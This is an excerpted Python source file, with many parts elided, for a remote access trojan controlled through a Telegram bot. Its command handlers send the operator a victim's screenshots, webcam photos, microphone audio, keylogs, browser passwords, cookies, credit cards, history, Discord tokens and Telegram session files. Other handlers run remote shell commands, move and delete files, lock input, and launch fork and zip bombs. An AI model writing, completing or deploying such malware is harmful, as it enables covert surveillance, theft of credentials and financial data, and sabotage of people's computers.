...
bot.worker_pool = telebot.util.ThreadPool(bot, num_threads=50)
...
def Screen(command):
	if command.chat.id == TelegramChatID:
		try:
			bot.send_chat_action(TelegramChatID, 'upload_photo')
			File = Directory + 'Screenshot.jpg'
			SecondFile = Directory + "Screenshot2.jpg"
			# if count_d == 1:
			# 	Screenshot(File)
			# 	Screen = open(File, 'rb')
			# 	bot.send_photo(TelegramChatID, Screen)
			# else:
			Screenshot(File, SecondFile)
			Screen = open(File, 'rb')
			ScreenSecond = open(SecondFile, "rb")

			bot.send_photo(TelegramChatID, Screen)
			bot.send_photo(TelegramChatID, ScreenSecond)
...
def Webcam(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_photo(TelegramChatID, Webcam)
...
def Audio(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Recording..._', parse_mode='Markdown')
			try:
				...
				bot.send_voice(TelegramChatID, Audio)
			...
			bot.send_message(TelegramChatID, '_Specify the recording duration_\n\n*› /Audio*', parse_mode='Markdown')
...
def ls(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			Dirs = '\n``'.join(os.listdir())
			bot.send_message(TelegramChatID, '`' + os.getcwd() + '`\n\n' + '`' + Dirs + '`', parse_mode='Markdown')
			...
			try:
				...
				for Dirse in SplittedText:
					bot.send_message(TelegramChatID, '`' + Dirse + '`', parse_mode='Markdown')
	...
	if command.chat.id == TelegramChatID:
		try:
			...
			try:
				...
				bot.send_message(TelegramChatID, '_Enter a file name_\n\n*› /Remove • /RemoveAll*', parse_mode='Markdown')
...
def RemoveAll(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Removing files..._', parse_mode='Markdown')
...
def Upload(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Uploading file..._', parse_mode='Markdown')
			...
			bot.send_message(TelegramChatID, '_Send file or paste URL_\n\n*› /Upload*', parse_mode='Markdown')
...
def Download(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Sending file..._', parse_mode='Markdown')
			bot.send_document(TelegramChatID, Download)
			...
			try:
				...
				File = re.split('/Download ', command.text, flags=re.I)[1]
				bot.send_message(TelegramChatID, '_Archiving..._', parse_mode='Markdown')
				shutil.make_archive(Directory + File,
									'zip',
									os.getcwd() + '\\',
									File)
				iFile = open(Directory + File + '.zip', 'rb')
				bot.send_message(TelegramChatID, '_Sending folder..._', parse_mode='Markdown')
				bot.send_document(TelegramChatID, iFile)
				iFile.close()
...
def Tasklist(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '`' + ProcessList() + '`', parse_mode='Markdown')
...
def Message(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Enter your message_\n\n*› /Message*', parse_mode='Markdown')
...
def Speak(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Speaking..._', parse_mode='Markdown')
			try:
			...
			bot.send_message(TelegramChatID, '_Enter your text_\n\n*› /Speak*', parse_mode='Markdown')
...
def OpenURL(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Enter your URL_\n\n*› /OpenURL*', parse_mode='Markdown')
...
def ForkBomb(command):
	if command.chat.id == TelegramChatID:
		...
		bot.send_message(TelegramChatID, '_Preparing ForkBomb..._', parse_mode='Markdown')
		Forkbomb()
...
def ZipBomb(command):
	if command.chat.id == TelegramChatID:
		...
		bot.send_message(TelegramChatID, '_Preparing ZipBomb..._', parse_mode='Markdown')
		Zipbomb()
...
def Discord(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '*Discord Token*\n\n`' + DiscordToken() + '`', parse_mode='Markdown')
...
def Telegram(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_chat_action(TelegramChatID, 'upload_document')

			TelegramSession(Directory)
			Telegram = open(Directory + 'tdata.zip', 'rb')

			bot.send_document(TelegramChatID, Telegram)
...
def CreditCards(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_document(TelegramChatID, CreditCards)
...
def Bookmarks(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_document(TelegramChatID, Bookmarks)
...
def Passwords(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_document(TelegramChatID, Passwords)
...
def Cookies(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_document(TelegramChatID, Cookies)
...
def History(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_document(TelegramChatID, History)
...
def Keylogger(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_document(TelegramChatID, Keylogs)

		except:
			bot.send_message(TelegramChatID, '_No keylogs recorded._', parse_mode='Markdown')
...
def SendKeys(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, '_Sending keys..._', parse_mode='Markdown')
			SendKeyPress(Text)
...
def Volume(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			VolumeControl(Level)
			bot.send_message(TelegramChatID, '_Audio volume set to_ *' + Level + '* _level!_', parse_mode='Markdown')

		except ValueError:
			bot.send_message(TelegramChatID, '_Specify the volume level in numbers_', parse_mode='Markdown')

		except:
			bot.send_message(TelegramChatID, '_Specify the audio volume_\n\n*› /Volume*', parse_mode='Markdown')
...
def Freeze(command):
	if command.chat.id == TelegramChatID:
		...
		if Admin() is False:
			bot.send_message(TelegramChatID, '_This function requires admin rights._', parse_mode='Markdown')

		if Admin() is True:
			try:

				Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
				bot.send_message(TelegramChatID, '_Keyboard and mouse locked for_ *' + Seconds + '* _seconds!_', parse_mode='Markdown')
				Block(float(Seconds))
				...
				bot.send_message(TelegramChatID, '_Specify the duration of the lock_\n\n*› /Freeze*', parse_mode='Markdown')
...
def CMD(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_message(TelegramChatID, Output)
			...
			try:
				...
				bot.send_message(TelegramChatID, '_Enter your command_\n\n*› /CMD*', parse_mode='Markdown')
...
def Location(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_chat_action(TelegramChatID, 'find_location')
			bot.send_message(TelegramChatID,
				'_Location_'
				'\n'
				'\n*IP Address* » `' + Geolocation('query') + '`' +
				'\n*Country* » `' + Geolocation('country') + '`' +
				'\n*City* » `' + Geolocation('city') + '`', parse_mode='Markdown') 
...
def Info(command):
	if command.chat.id == TelegramChatID:
		try:
			...
			bot.send_chat_action(TelegramChatID, 'typing')
			bot.send_message(TelegramChatID, 
				'\n_Computer Info_'
				'\n'
...
def Main(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '`...`', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2', '5'])
def Main(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['4', '1'])
def Main(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '`...`', reply_markup=main8, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '_Select an action_', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '_Select an action_', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '`...`', reply_markup=main7, parse_mode='Markdown')
...
def Wallpapers(command):
	if command.chat.id == TelegramChatID:
		bot.send_message(TelegramChatID, '_Send photo which you would like to set on the Wallpapers_', parse_mode='Markdown')
